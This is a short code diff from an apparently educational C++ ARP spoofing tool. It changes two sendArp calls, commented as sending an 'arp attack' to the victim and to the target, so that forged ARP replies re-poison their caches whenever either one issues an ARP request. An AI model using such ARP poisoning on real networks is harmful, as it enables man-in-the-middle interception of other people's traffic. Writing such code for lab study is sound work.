@@ -155,7 +155,7 @@ int main(int argc, char* argv[]) {
                     }
 		    if(arpHdr->op() == htons(ArpHdr::Request) && arpHdr->tip() == ipVec[i].second){
                        // send arp attack to victim
-                       sendArp(pcap, my_mac, smacVec[i], ipVec[i].second, ipVec[i].first, my_mac, smacVec[i]);
+                       sendArp(pcap, my_mac, smacVec[i], ipVec[i].second, ipVec[i].first, my_mac, smacVec[i],ArpHdr::Reply);
 		    }
 		}
                 else if(arpHdr->sip() == ipVec[i].second){
@@ -168,7 +168,7 @@ int main(int argc, char* argv[]) {
                     }
 		    if(arpHdr->op() == htons(ArpHdr::Request) && arpHdr->tip() == ipVec[i].first){
 			    //send arp attack to target
-                    	    sendArp(pcap, my_mac, tmacVec[i], ipVec[i].first, ipVec[i].second , my_mac, tmacVec[i]);
+                    	    sendArp(pcap, my_mac, tmacVec[i], ipVec[i].first, ipVec[i].second , my_mac, tmacVec[i],ArpHdr::Reply);
 		    }
                 }
             }
